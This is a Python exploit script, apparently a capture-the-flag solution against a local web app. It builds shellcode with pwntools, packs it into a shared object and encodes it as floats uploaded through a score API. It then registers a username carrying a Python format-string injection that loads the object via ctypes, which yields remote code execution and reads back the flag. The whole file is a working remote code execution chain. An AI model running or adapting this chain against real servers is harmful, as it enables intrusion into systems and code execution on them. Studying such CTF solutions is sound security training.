import requests, secrets, os, math, sys, re, struct
from tempfile import NamedTemporaryFile
from pwn import *  # yes, seriously

context.arch = "amd64"
prologue = open("prologue.txt").read()

url = "http://127.0.0.1:5000"  # url of server


def cmd_2_shellcode(cmd):
    shellcode = shellcraft.execve("/bin/sh", ["/bin/sh", "-c", cmd], 0)
    shellcode = re.sub(r"/\*.*?\*/", "", shellcode)
    shellcode = re.sub(r"(\n    ){2,}", r"\n    ", shellcode)
    shellcode = shellcode.replace("ptr ", "")
    shellcode = shellcode.replace("SYS_execve", "0x3b")
    return shellcode[4:]


def generate_so(cmd):
    assembly = prologue + cmd_2_shellcode(cmd) + "\n\nfilesize      equ     $ - $$"
    # print(assembly)
    tmp1, tmp2 = NamedTemporaryFile(suffix=".asm"), NamedTemporaryFile(suffix=".bin")
    with open(tmp1.name, "w") as f:
        f.write(assembly)
    os.system(f"nasm -f bin -o {tmp2.name} {tmp1.name}")
    with open(tmp2.name, "rb") as f:
        data = f.read()
    return data


def bytes_to_floats(b):
    b += b"\x00" * (-len(b) % 8)  # pad w/ null
    floats = list(memoryview(b).cast("d"))
    if "nan" in str(floats):
        print(
            f"Error: {str(floats).count('nan')} 'nan'(s) in output, RCE will likely fail"
        )
        sys.exit()
    floats += [sys.float_info.max] * 1  # force 'score' to improve
    return floats


def info(text):
    print(f"[\x1b[32;1m+\x1b[0m] {text}")


def rand_str(l):
    assert l <= 43
    return secrets.token_urlsafe()[:l]


info("Registering first user...")
r = requests.Session()
username1, password1 = rand_str(8), rand_str(8)
r.post(
    f"{url}/signup", {"username": username1, "password": password1, "submit": "Submit"}
)

info("Logging in as user1...")
r.post(
    f"{url}/login", {"username": username1, "password": password1, "submit": "Submit"}
)
users = r.get(f"{url}/api/score").json()
# uid1 = int([x['id'] for x in users if x['username'] == username1][0])
uid1 = int(users["id"])
info("Creating malicious .so...")

command = (
    f"/readflag > ./app/scores/{uid1+1}.score;echo AAAAAA>>./app/scores/{uid1+1}.score"
)
sobytes = generate_so(command)
so_write = bytes_to_floats(sobytes)

info("Uploading malicious .so...")
b = r.post(f"{url}/api/score/submit", json={"counts": so_write})
if b.json()["status"] == "unimproved":
    info(f"ERROR: score did not improve (was {b.json()['score']})")
    sys.exit()
if b.json()["status"] == "error":
    info(f"ERROR: score broke")
    sys.exit()

info("Creating malicious user...")
username2, password2 = (
    f"{{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[./app/scores/{uid1}.score]}}",
    rand_str(8),
)
r.post(
    f"{url}/signup", {"username": username2, "password": password2, "submit": "Submit"}
)
r.post(
    f"{url}/login", {"username": username2, "password": password2, "submit": "Submit"}
)
r.post(f"{url}/api/score/submit", json={"counts": [1, 2, 3]})


info("Triggering RCE...")
r.get(f"{url}/api/score/{uid1+1}")
info("RCE should've triggered!")

info("Reading exfiltrated flag...")
counts = r.get(f"{url}/api/score").json()["score"]
flag = struct.pack("d" * len(counts), *counts)
print(f"Flag: {flag.decode()}")
